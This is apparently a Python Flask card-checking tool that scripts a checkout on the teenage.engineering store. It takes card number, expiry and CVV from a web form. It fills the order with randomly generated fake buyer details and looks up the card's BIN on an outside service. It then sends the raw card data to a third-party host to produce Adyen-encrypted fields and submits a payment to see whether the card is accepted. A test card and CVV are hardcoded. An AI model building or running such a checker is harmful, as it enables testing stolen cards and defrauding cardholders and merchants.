from flask import Flask, render_template, request, jsonify
import requests
from userinfo import RandUser
import urllib3

urllib3.disable_warnings()

app = Flask(__name__)

def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return


cc = "4000222621818451"
mes = "09"
ano = "2026"
cvv = "589"


def adyen_bh(cc, mes, ano, cvv):
    r = requests.Session()
    # r.proxies = {"http": proxy_info, "https": proxy_info}
    user_add = RandUser().rand_user()
    r.cookies.clear()
    r.verify = False

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        # 'Accept-Encoding': 'gzip, deflate, br',
        "DNT": "1",
        "Alt-Used": "teenage.engineering",
        "Connection": "keep-alive",
        "Referer": "https://teenage.engineering/store/field-tote/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    response = r.get(
        "https://teenage.engineering/_api/mw/selections/26b26e4bc95ec3ad0124adf8fb861980",
        headers=headers,
    )

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        # 'Accept-Encoding': 'gzip, deflate, br',
        "Origin": "https://teenage.engineering",
        "DNT": "1",
        "Alt-Used": "teenage.engineering",
        "Connection": "keep-alive",
        "Referer": "https://teenage.engineering/store/field-tote/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        # 'Content-Length': '0',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    response = r.post(
        "https://teenage.engineering/_api/mw/selections/26b26e4bc95ec3ad0124adf8fb861980/items/2195-1401/quantity/1",
        headers=headers,
    )

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        # 'Accept-Encoding': 'gzip, deflate, br',
        "DNT": "1",
        "Alt-Used": "teenage.engineering",
        "Connection": "keep-alive",
        "Referer": "https://teenage.engineering/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
    }

    response = r.get("https://teenage.engineering/store/cart", headers=headers)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        # 'Accept-Encoding': 'gzip, deflate, br',
        "Content-Type": "application/json",
        "Origin": "https://teenage.engineering",
        "DNT": "1",
        "Alt-Used": "teenage.engineering",
        "Connection": "keep-alive",
        "Referer": "https://teenage.engineering/store/checkout/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    json_data = {
        "termsAndConditions": True,
        "address_state": user_add["province"],
        "address_country": "US",
        "address_email": user_add["email"],
        "address_phoneNumber": user_add["phone"],
        "address_firstName": user_add["first_name"],
        "address_lastName": user_add["last_name"],
        "address_address1": user_add["street"],
        "address_address2": "",
        "address_zipCode": user_add["zip"],
        "address_company": "",
        "address_city": user_add["city"],
        "paymentMethod": "adyen-drop-in",
        "paymentInitiateOnly": True,
    }

    response = r.post(
        "https://teenage.engineering/_api/mw/selections/26b26e4bc95ec3ad0124adf8fb861980/payment",
        headers=headers,
        json=json_data,
    )

    response = requests.get(
        f"https://bins.antipublic.cc/bins/{cc[:6]}", headers=headers
    )
    brand_mapping = {
        "VISA": "visa",
        "MASTERCARD": "mc",
        "AMERICAN EXPRESS": "amex",
        "DINERS CLUB": "diners",
        "DISCOVER": "discover",
    }
    response_data = response.json()
    brand = brand_mapping.get(response_data.get("brand", ""))

    meeq = f"20{ano[-2:]}".replace("2020", "20")
    adyenKey = "10001|8CA348DE09B5AFC308EE814BE4BE105301F7251137C6CEAA285BFCB0FD6CD79C951D05FC46DEA53A76533D88705A28B3AEC87B67FACB4A2A52044BE81781D5253009A3086A35E53356BDC2B5E408F66315797068B9D85F82537909080BDD07AACD9559FB41443C801486967C013B805F721E5B88EF52B732D154B8CE067CF23A339263E00DB8C95E4CFF9E4B2C817258633253A7A0FC837A9B5C15D19B0B654D18534006162C5B8B5E816837DDE89CDFD1E22A0EB866B63486AAB0308DEBCE21C70BA6FD9EED58B1A36C81C918167DA52465C738EF23762826FEC9A11032B3627BB21B870E9DC118859416C0424471B0B1A58959569877A00D4612F999F3AAA7"
    version = "25"
    url = "https://asianprozyy.us/encrypt/adyen"

    payload = {
        "card": f"{cc}|{mes}|{meeq}|{cvv}",
        "adyenKey": adyenKey,
        "version": version,
        "key": "live_FAQ7CUZM7JAO7K6CGXI67KMZ64K35AVH",
        "dom": "https://teenage.engineering",
    }

    headers = {
        "User-Agent": "PostmanRuntime/7.31.1",
        "Content-Type": "application/json",
    }

    response = requests.get(url, params=payload, headers=headers, verify=False)
    adyen_key = response.json()

    riskData = adyen_key["riskData"]
    encryptedCardNumber = adyen_key["encryptedCardNumber"]
    encryptedExpiryMonth = adyen_key["encryptedExpiryMonth"]
    encryptedExpiryYear = adyen_key["encryptedExpiryYear"]
    encryptedSecurityCode = adyen_key["encryptedSecurityCode"]
    riskData, encryptedCardNumber, encryptedExpiryMonth, encryptedSecurityCode

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        # 'Accept-Encoding': 'gzip, deflate, br',
        "Content-Type": "application/json",
        "Origin": "https://teenage.engineering",
        "DNT": "1",
        "Alt-Used": "teenage.engineering",
        "Connection": "keep-alive",
        "Referer": "https://teenage.engineering/store/checkout/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    json_data = {
        "paymentMethodSpecificFields": {
            "riskData": {
                "clientData": riskData,
            },
            "paymentMethod": {
                "type": "scheme",
                "holderName": "Jake Smith",
                "encryptedCardNumber": encryptedCardNumber,
                "encryptedExpiryMonth": encryptedExpiryMonth,
                "encryptedExpiryYear": encryptedExpiryYear,
                "encryptedSecurityCode": encryptedSecurityCode,
                "brand": brand,
            },
            "browserInfo": {
                "acceptHeader": "*/*",
                "colorDepth": 24,
                "language": "en-US",
                "javaEnabled": False,
                "screenHeight": 864,
                "screenWidth": 1536,
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
                "timeZoneOffset": -330,
            },
            "clientStateDataIndicator": True,
        },
        "paymentMethod": "adyen-drop-in",
        "termsAndConditions": True,
        "address": {
            "firstName": user_add["first_name"],
            "lastName": user_add["last_name"],
            "company": "",
            "address1": user_add["street"],
            "address2": "",
            "city": user_add["city"],
            "country": "US",
            "zipCode": user_add["zip"],
            "phoneNumber": user_add["phone"],
            "email": user_add["email"],
            "state": user_add["province"],
        },
    }

    e = r.post(
        "https://teenage.engineering/_api/mw/selections/26b26e4bc95ec3ad0124adf8fb861980/payment2",
        headers=headers,
        json=json_data,
    )
    if "errors" in e.text:
        return f"{cc}|{mes}|{ano}|{cvv}", e.text
    else:
        f"{cc}|{mes}|{ano}|{cvv}", "3D Authentication Failed"


@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    if request.method == 'POST':
        input_text = request.form['credit_info']
        cc, mm, yy, cvv = input_text.split('|')
        result = adyen_bh(cc, mm, yy, cvv)
    return render_template('index.html', result=result)

if __name__ == '__main__':
    app.run(debug=True)